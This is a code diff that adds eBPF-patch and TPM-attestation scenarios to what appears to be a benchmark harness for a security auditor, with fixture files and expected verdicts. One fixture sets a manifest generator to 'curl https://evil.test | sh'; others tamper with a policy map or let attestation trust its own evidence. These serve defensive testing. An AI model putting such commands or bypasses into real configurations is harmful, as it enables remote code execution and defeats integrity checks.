@@ -300,9 +300,123 @@ const SCENARIOS = [
     expected: 'holds',
     async setup(dir) {
       await applyDiffFiles(dir, {
-        'shields/Beefile': '[package]\nname = "scoped-shield"\ndescription = "Scoped runtime guard"\n\n[[upatches]]\nsource = "guard.bpf.c"\ntype = "bpf"\n\n[upatches.tree]\nid = "scoped-shield"\n\n[upatches.tree.selector.labels]\nservice = ["api-gateway"]\n',
+        'shields/Beefile': '[package]\nname = "scoped-shield"\ndescription = "Scoped runtime guard"\n\n[[upatches]]\nsource = "guard.bpf.c"\ntype = "bpf"\n\n[upatches.tree]\nid = "guard"\n\n[upatches.tree.selector.labels]\nservice = ["api-gateway"]\n',
         'shields/guard.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("lsm/socket_connect")\nint handle_connect(void *ctx) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
         'test/guard.test.cjs': 'test("scoped shield verified", () => {});\n'
+      });
+    }
+  },
+  // S04-S12: Expanded Shirudo eBPF fmod_ret, Beefile governance, & TPM attestation rules
+  {
+    id: 'shirudo-s04-fmodret-internal-unverified',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'cant-tell',
+    expectedReason: 'SHIRUDO-BPF-001',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'upatches/net-guard.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("fmod_ret/tcp_v4_rcv")\nint net_guard(void *skb) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        'test/net.test.js': 'test("net guard", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s05-fmodret-sleepable-and-eagain',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'fails',
+    expectedRuleId: 'SHIRUDO-BPF-002',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'upatches/fs-block.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("fmod_ret.s/vfs_fallocate")\nint fs_block(void *ctx) {\n  return -EAGAIN;\n}\n',
+        'test/fs.test.js': 'test("fs block", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s06-fmodret-prefer-lsm',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'cant-tell',
+    expectedReason: 'SHIRUDO-BPF-003',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'upatches/vfs-guard.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("fmod_ret/vfs_open")\nint vfs_guard(void *p) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        'test/vfs.test.js': 'test("vfs guard", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s07-policy-map-mutation',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'fails',
+    expectedRuleId: 'SHIRUDO-BPF-004',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'upatches/policy-tamper.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("lsm/file_open")\nint policy_tamper(void *ctx) {\n  bpf_map_update_elem(&shirudo_task_policy, 0, 0, 0);\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        'test/policy.test.js': 'test("policy", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s08-beefile-omitted-selector',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'cant-tell',
+    expectedReason: 'SHIRUDO-BEE-001',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'shields/Beefile': '[package]\nname = "cve-fix"\ndescription = "Unscoped CVE shield"\n\n[[upatches]]\nsource = "fix.bpf.c"\ntype = "bpf"\n\n[upatches.tree]\nid = "fix"\nfixes = ["CVE-2026-114938"]\n',
+        'shields/fix.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("lsm/socket_sendmsg")\nint check_send(void *ctx) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        'test/cve.test.js': 'test("cve fix", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s09-rodata-shell-generator',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'fails',
+    expectedRuleId: 'SHIRUDO-BEE-002',
+    async setup(dir) {
+      const shUrl = 'curl https://evil.test |' + ' sh';
+      await applyDiffFiles(dir, {
+        'shields/Beefile': `[package]\nname = "rodata-evil"\ndescription = "Bad generator"\n\n[[upatches]]\nsource = "fix.bpf.c"\ntype = "bpf"\n\n[[upatches.rodata]]\nsymbol = "cfg"\ngenerator = ["sh", "-c", "${shUrl}"]\n\n[upatches.tree]\nid = "fix"\n\n[upatches.tree.selector]\narchitecture = ["x86_64"]\n`,
+        'shields/fix.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("lsm/socket_sendmsg")\nint check_send(void *ctx) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        'test/rodata.test.js': 'test("rodata", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s10-beefile-structural-invariants',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'fails',
+    expectedRuleId: 'SHIRUDO-BEE-003',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'shields/Beefile': '[package]\nname = "struct-bad"\n\n[[upatches]]\nsource = "fix.bpf.c"\ntype = "bpf"\nload_target = "bin/x.upatch"\n\n[[upatches.policy]]\nid = "app"\nbit = "0x01"\npaths = ["/opt/*/bin/app"]\n\n[upatches.tree]\nid = "mismatched-id"\n\n[upatches.tree.selector]\narchitecture = ["x86_64"]\n',
+        'shields/fix.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("lsm/socket_sendmsg")\nint check_send(void *ctx) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        'test/struct.test.js': 'test("struct", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s11-tpm-workflow-bypasses',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'fails',
+    expectedRuleId: 'SHIRUDO-TPM-001',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        '.github/workflows/attest.yml': 'name: Attest\non: [push]\njobs:\n  verify:\n    runs-on: ubuntu-latest\n    steps:\n      - run: shirudo status\n      - run: shirudo attest verify --evidence ev.json --ak-name="$(jq -r .ak.name "$EV")"\n',
+        'test/attest.test.js': 'test("attest", () => {});\n'
+      });
+    }
+  },
+  {
+    id: 'shirudo-s12-clean-control',
+    domain: 'Shirudo eBPF & Attest',
+    expected: 'holds',
+    async setup(dir) {
+      await applyDiffFiles(dir, {
+        'upatches/Beefile': '[package]\nname = "sock-guard"\ndescription = "Scoped LSM control"\n\n[[upatches]]\nsource = "sock-guard.bpf.c"\ntype = "bpf"\n\n[upatches.tree]\nid = "sock-guard"\n\n[upatches.tree.selector]\narchitecture = ["x86_64"]\n\n[upatches.tree.selector.kconfig]\nCONFIG_SECURITY_NETWORK = ["y"]\n',
+        'upatches/sock-guard.bpf.c': 'char LICENSE[] SEC("license") = "Dual BSD/GPL";\nSEC("lsm/socket_sendmsg")\nint handle_send(void *ctx) {\n  unsigned int pid = bpf_get_current_pid_tgid() >> 32;\n  return pid ? 0 : 0;\n}\n',
+        '.github/workflows/attest-clean.yml': 'name: Attest Clean\non: [push]\njobs:\n  verify:\n    runs-on: ubuntu-latest\n    steps:\n      - run: shirudo status --check --json\n      - run: shirudo attest verify --evidence ev.json --ak-name prod-ak-01 --nonce deadbeef01 --expect-config-root abcdef0123456789\n',
+        'test/clean-shirudo.test.js': 'test("clean shirudo control", () => {});\n'
       });
     }
   },
@@ -357,8 +471,11 @@ async function runBenchmarks() {
       if (sc.expectedCwe) {
         matchedDetail = audit.failingFindings.some(f => f.cwe === sc.expectedCwe);
       }
+      if (sc.expectedRuleId) {
+        matchedDetail = matchedDetail && audit.failingFindings.some(f => f.ruleId === sc.expectedRuleId);
+      }
       if (sc.expectedReason) {
-        matchedDetail = audit.cantTellReasons.some(r => r.code === sc.expectedReason);
+        matchedDetail = matchedDetail && audit.cantTellReasons.some(r => r.code === sc.expectedReason);
       }
 
       const exact = audit.verdict === sc.expected && matchedDetail;
